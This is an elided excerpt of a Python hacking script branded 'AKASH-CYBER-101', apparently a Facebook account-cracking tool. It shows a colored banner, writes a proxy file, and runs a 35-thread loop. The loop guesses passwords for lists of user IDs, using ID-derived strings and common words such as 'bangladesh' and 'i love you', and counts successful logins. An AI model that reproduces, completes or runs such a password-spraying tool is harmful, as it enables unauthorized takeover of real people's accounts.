...
logo =("""\033[1;32m
      AAA   KK  KK   AAA    SSSSS  HH   HH 
      AAAAA  KK KK   AAAAA  SS      HH   HH 
      AA   AA KKKK   AA   AA  SSSSS  HHHHHHH 
      AAAAAAA KK KK  AAAAAAA      SS HH   HH 
       AA   AA KK  KK AA   AA  SSSSS  HH   HH 
           ┌━━━━━━━━━━━━━━━━━ AKASH━━━━━━━━━━━━━━━━━━━┑
               \033[1;97mCREATED BY   :  CYBER101       
               \033[1;91mFACEBOK      : A　K　A　S　H　ツ 
               \033[1;97mGITHUB       :  AKASH-CYBER-101  
               \033[1;91mSTATUS       :   PREMIUM           
               \033[1;97mTEAM         :  Cyber101                
...
try:
    ...
    open('.prox.txt','w').write(prox)
	  ...
	  print('WELCOME TO AKASH-CYBER-101 TOOLS🔥')
...
def ak5():
    ...
    with ThreadPool(max_workers=35) as setu:
        ...
        for love in user:
            ...
            bl=uid[:6]
            lb=uid[0:6]
            pwx = [bl,lb,'bangladesh','i love you','sunnyleon',]
            setu.submit(bcrack,uid,pwx,tl)
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\r\033[1;37m[AKASH\033[1;37m]  [%s/%s]  OK-%s'%(loop,tl,len(oks))),
            sys.stdout.flush()
